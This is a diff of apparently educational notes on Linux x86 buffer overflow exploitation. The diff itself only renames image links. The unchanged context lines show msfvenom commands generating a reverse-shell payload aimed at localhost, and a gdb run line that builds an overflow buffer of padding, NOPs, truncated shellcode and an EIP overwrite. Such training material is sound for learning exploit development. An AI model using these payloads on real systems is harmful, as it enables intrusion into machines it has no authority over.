@@ -69,7 +69,7 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform l
 
 #### 5 : Finding Shellcode Space : Garbage + NOPs + Payload + EIP
 
-![](<../.gitbook/assets/image (2) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1).png>)
 
 ```bash
     # Pre-final padding (Garbage - NOPs - Payload - EIP)
@@ -155,7 +155,7 @@ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c -
 run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
 ```
 
-![](<../.gitbook/assets/image (9).png>)
+![](<../.gitbook/assets/image (9) (1).png>)
 
 ⚡ **Choose an address to which we refer the EIP and which reads and executes one byte after the other starting at this address.**
 
